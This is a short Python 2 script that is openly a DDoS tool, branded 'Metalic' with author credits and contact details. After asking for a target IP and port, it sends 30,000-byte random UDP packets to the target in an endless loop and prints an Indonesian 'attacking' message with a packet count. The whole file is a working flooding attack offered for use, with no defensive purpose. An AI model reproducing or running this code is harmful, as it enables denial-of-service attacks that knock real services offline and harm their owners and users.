import sys
import os
import time
import socket
import random
import datetime


############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(30000)
############

os.system("clear")
time = time.ctime(time.time())
print
print """\033[31;1m
__  __      _        _ _
|  \/  | ___| |_ __ _| (_) ___
| |\/| |/ _ \ __/ _` | | |/ __|
| |  | |  __/ || (_| | | | (__
|_|  |_|\___|\__\__,_|_|_|\___|

\033[32;1mCreated   : Jhosua Saut Maruli
\033[32;1mWhatsapp  : 081260032271
\033[32;1mChannel   : Mr.F4K3 YT
\033[32;1mGmail     : lucfaker666@gmail.com
\033[32;1mType      : DDOS
----------------------------------------------
""" 
print
ip = raw_input("\033[32;1mIP Target : ")
port = input  ("\033[32;1mPort      : ")
os.system("clear")
sent = 0 
    
while True:
        
        sock.sendto(bytes, (ip, port)) 
        
        port = port + 0
        
        sent = sent + 1 
        
        print "\033[32;1mMenyerang \033[31;1m%s \033[32;1mdengan port \033[33;1m%s  \033[32;1mbytes \033[34;1m%s"%(ip, port, sent)


if __name__ == '__main__': 
        
        main()
    
     
    
    
